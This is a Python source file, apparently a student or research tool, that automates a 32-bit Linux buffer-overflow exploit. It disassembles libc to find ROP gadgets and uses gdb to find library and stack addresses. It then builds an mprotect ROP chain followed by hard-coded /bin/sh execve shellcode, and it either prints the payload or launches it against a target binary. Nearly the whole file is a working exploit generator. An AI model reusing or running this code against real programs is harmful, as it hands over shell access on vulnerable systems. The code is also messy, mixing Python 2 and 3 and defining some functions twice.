from capstone import *
from elftools.common.py3compat import bytes2str
from elftools.elf.elffile import ELFFile
import re
import sys
import argparse
import subprocess
import struct
import io
import os
import binascii


	# print(instr)
	# print(instr.address,instr.mnemonic, instr.op_str)

# print(instr_list)
def find_inc_eax_ret(instr_list, library_base_addr):
	addressList = []

	for index in range(len(instr_list)):
		if instr_list[index].mnemonic == 'add' and 'eax, 1' == instr_list[index].op_str:
			
			if instr_list[index+1].mnemonic == 'ret':
				
				return (instr_list[index].address)+library_base_addr
	

	return None

def find_add_ebx_eax_ret(instr_list, library_base_addr):
	addressList = []

	for index in range(len(instr_list)):
		if instr_list[index].mnemonic == 'add' and 'ebx, ' in instr_list[index].op_str:
			
			if instr_list[index+2].mnemonic == 'ret':
				
				return (instr_list[index].address)+library_base_addr
	

	return None




def find_pop_edx_ret(instr_list, library_base_addr):
	for index in range(len(instr_list)):
		if instr_list[index].mnemonic == 'pop' and'edx' == instr_list[index].op_str:
			if instr_list[index+1].mnemonic == 'ret':
				return (instr_list[index].address)+library_base_addr
			
	return None

def find_pop_eax_ret(instr_list, library_base_addr):
	for index in range(len(instr_list)):
		if instr_list[index].mnemonic == 'pop' and'eax' == instr_list[index].op_str:
			if instr_list[index+1].mnemonic == 'ret':
				return (instr_list[index].address)+library_base_addr
			
	return None





def find_pop_ecx_ret(instr_list, library_base_addr):
	for index in range(len(instr_list)):
		if instr_list[index].mnemonic == 'pop' and instr_list[index].op_str == 'ecx':
			if instr_list[index+1].mnemonic == 'ret':
				return instr_list[index].address+library_base_addr
	return None


def find_inc_ecx_ret(instr_list, library_base_addr):
	for index in range(len(instr_list)):
		if instr_list[index].mnemonic == 'inc':
			if instr_list[index+1].mnemonic == 'ret':
				return instr_list[index].address+library_base_addr
	return None

def find_ecx_ebx_ret(instr_list, library_base_addr):
	for index in range(len(instr_list)):
		if instr_list[index].mnemonic == 'pop' and instr_list[index].op_str == 'ecx':
			if instr_list[index+1].mnemonic == 'pop' and instr_list[index+1].op_str == 'ebx':
				if instr_list[index+2].mnemonic == 'ret':
			    		return instr_list[index].address+library_base_addr
	return None

def find_ret(instr_list, library_base_addr):
	for index in range(len(instr_list)):
		if (instr_list[index].mnemonic == 'ret'):
			return instr_list[index].address+library_base_addr
	return None



def find_jmp_esp(instr_list, library_base_addr):
	for index in range(len(instr_list)):
		if instr_list[index].mnemonic == 'jmp' and 'esp' in instr_list[index].op_str:
			return (instr_list[index].address)+library_base_addr
	addr = raw_input("GADGET NOT FOUND IN THE LIBC. DO YOU KNOW ADDRESS OF jmp esp;?")
			
	return int(addr, 16)

def find_inc_ebx_ret(instr_list, library_base_addr):
	for index in range(len(instr_list)):
		if instr_list[index].mnemonic == 'inc' and 'ebx' == instr_list[index].op_str:
			if instr_list[index+1].mnemonic == 'ret':
				return instr_list[index].address+library_base_addr
	addr = raw_input("GADGET NOT FOUND IN THE LIBC. DO YOU KNOW ADDRESS OF inc ebx; ret?")
			
	return int(addr, 16)

def find_inc_ecx_ret(instr_list, library_base_addr):
	for index in range(len(instr_list)):
		if instr_list[index].mnemonic == 'inc' and 'ecx' == instr_list[index].op_str:
			if instr_list[index+1].mnemonic == 'ret':
				return instr_list[index].address+library_base_addr
	addr = raw_input("GADGET NOT FOUND IN THE LIBC. DO YOU KNOW ADDRESS OF inc ecx; ret?")
			
	return int(addr, 16)

def find_inc_edx_ret(instr_list, library_base_addr):
	for index in range(len(instr_list)):
		if instr_list[index].mnemonic == 'inc' and 'edx' == instr_list[index].op_str:
			if instr_list[index+1].mnemonic == 'ret':
				return instr_list[index].address+library_base_addr
	addr = raw_input("GADGET NOT FOUND IN THE LIBC. DO YOU KNOW ADDRESS OF inc edx; ret?")
			
	return int(addr, 16)




# print(find_pop_eax_ret(instr_list))
# print(find_dec_ebx_ret(instr_list))
def exe_mprotect(instr_list, stackAddr, syscall_base):

    ret_adr = struct.pack('<I', (find_ret(instr_list, library_base_addr)))
    
    ffffffff = struct.pack('<I', 0xffffffff)
    pop_eax = struct.pack('<I',(find_pop_eax_ret(instr_list, library_base_addr)))
    inc_eax = struct.pack('<I',(find_inc_eax_ret(instr_list, library_base_addr)))
    pop_ecx_ebx = struct.pack('<I', (find_ecx_ebx_ret(instr_list, library_base_addr)))
    stack_addr_minus_one = struct.pack('<I', (stackAddr -1))
    inc_ebx = struct.pack('<I', (find_inc_ebx_ret(instr_list, library_base_addr)))
    inc_edx = struct.pack('<I', (find_inc_edx_ret(instr_list, library_base_addr)))
    msize = struct.pack('<I', 0x11111108)
    permission = struct.pack('<I', 0x07070707)
    dummy = struct.pack('<I', 0x41414141)
    pop_edx = struct.pack('<I', (find_pop_edx_ret(instr_list, library_base_addr)))
    jmp_esp = struct.pack('<I', (find_jmp_esp(instr_list, library_base_addr)))
    libc_syscall = struct.pack('<I', (syscall_base+32))
    
    

    ##instruction that pop stack value to $eax - to be implemented
    ##eax = 125 || 0x7d
    ##find_pop_eax_ret : pop %eax; ret;
    buf = ret_adr
    buf += ret_adr
    buf += ret_adr

    buf += pop_eax
    buf += ffffffff
    buf += inc_eax * 126

    buf += pop_ecx_ebx
    buf += msize
    buf += stack_addr_minus_one
    buf += inc_ebx


    buf += pop_edx
    buf += ffffffff
    buf += inc_edx * 8
    
    buf += libc_syscall
    

    buf += dummy
    buf += dummy
    buf += dummy
    buf += dummy
    
    buf += jmp_esp

    return buf

def find_libc_path(vuln_binary):
    cmd = "ldd " + vuln_binary
    cmd = cmd + "|grep libc|head -1|awk '{print $3}'"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    proc.wait()
    try:
        libc_path = proc.stdout.read()
        return libc_path.rstrip()
    except Exception as e:

        return ""
    return ""

def find_library_base_addr(vuln_binary, library_path):
    with io.FileIO("test.gdb", "w") as file:
        file.write("b main\nrun hello\ninfo proc mappings\n".encode('ascii'))
        file.close()

    cmd = "gdb --batch --command=./test.gdb --args "
    cmd = cmd + vuln_binary
    cmd = cmd + " hello|grep " + os.path.realpath(library_path) + "|head -1|awk '{print $1}'"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    status = proc.wait()

    if status != 0:

        return 0
    try:
        library_base_addr = int(proc.stdout.read(), 16)
    except Exception as e:

        return 0

    os.remove("./test.gdb")
    return library_base_addr



def find_syscall_base_addr(vuln_binary):
    with io.FileIO("test3.gdb", "w") as file:
        file.write("b main\nrun hello\nx/i syscall\n".encode('ascii'))
        file.close()

    cmd = "gdb --batch --command=./test3.gdb --args "
    cmd = cmd + vuln_binary
    cmd = cmd + " hello | grep syscall"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    status = proc.wait()
    
    rslt = str(proc.stdout.read()).split()[0]


    if status != 0:

        return 0
    try:
        library_base_addr = int(rslt, 16)
    except Exception as e:

        return 0

    os.remove("./test3.gdb")
    return library_base_addr

def find_library_base_addr2(vuln_binary, library_path):
    with io.FileIO("test.gdb", "w") as file:
        file.write("b main\nrun hello\ninfo proc mappings\n".encode('ascii'))
        file.close()

    cmd = "gdb --batch --command=./test.gdb --args "
    cmd = cmd + vuln_binary
    cmd = cmd + " hello|grep " + str(os.path.realpath(library_path), 'utf-8') + "|head -1|awk '{print $2}'"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    status = proc.wait()
    print("afafafaf   " + str(os.path.realpath(library_path), 'utf-8'))
    if status != 0:

        return 0
    try:
        library_base_addr = int(proc.stdout.read(), 16)
    except Exception as e:

        return 0

    os.remove("./test.gdb")
    return library_base_addr

def find_stack_address(vuln_binary):
    with io.FileIO("test2.gdb", "w") as file:
        file.write("b main\nrun hello\ninfo proc mappings\n\n".encode('ascii'))
        file.close()

    cmd = "gdb --batch --command=./test2.gdb --args "
    cmd = cmd + vuln_binary
    cmd = cmd + " hello | grep stack |head -1|awk '{print $1}'"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    status = proc.wait()
    os.remove("./test2.gdb")
    return int(proc.stdout.read(),16)

    
    



def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-binaries", nargs = 1, type = str, help = 'binaries')
    parser.add_argument("-bufferLength", nargs = 1, type = int)
    parser.add_argument("-mode", nargs = 1, type =str)


    options = parser.parse_args()
    return options

if __name__ == '__main__':
    filename = '/lib/i386-linux-gnu/libc.so.6'
    f = open(filename, "rb")
    elffile = ELFFile(f)
    print(elffile)
    md = Cs(CS_ARCH_X86, CS_MODE_32)
    md.detail = False

    md.skipdata_setup = ("db",None, None)
    md.skipdata = True
    textSec = elffile.get_section_by_name('.text')
    startAddr = textSec.header['sh_addr']
    val = textSec.data()

    
    

    options = get_arguments()
    binaryList = options.binaries
    bufferLength = options.bufferLength[0]
    
    mode = options.mode[0]
    if mode != 'test' and mode != 'payload':
    	print("Mode Argument Has To Be Either test or payload")
	sys.exit()
    print("Buffer Length : " + str(bufferLength))



    numFile = len(binaryList)
    if (numFile == 0):
            print("Put At Least One Binary File")
            sys.exit()


    print(find_libc_path(binaryList[0]))
    library_base_addresses = []
    library_base_addr = find_library_base_addr(binaryList[0], find_libc_path(binaryList[0]))

    print(hex(library_base_addr))

    print(hex(find_stack_address(binaryList[0])))

    instr_list = []
    for instr in md.disasm(val, startAddr):
	    instr_list.append(instr)
    shellcode =  ""
    shellcode += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
    



    print(hex(find_syscall_base_addr(binaryList[0])))

    buf = ("A" * (bufferLength + 4))
    stackAddr = find_stack_address(binaryList[0])
    syscall_base_Addr = find_syscall_base_addr(binaryList[0])

    
    buf =  buf+exe_mprotect(instr_list,stackAddr, syscall_base_Addr) + shellcode
    print(buf)
    

    buf1 = buf.encode("hex")
    buf2 = ''
    for index in range(len(buf1)):
	if index % 2==0:
	    buf2+=('\\x')
	buf2+=(buf1[index])
    if mode == 'payload':
    	print(buf2)
    if mode == 'test':	
    	p = subprocess.call(["./"+binaryList[0], buf])

    




    

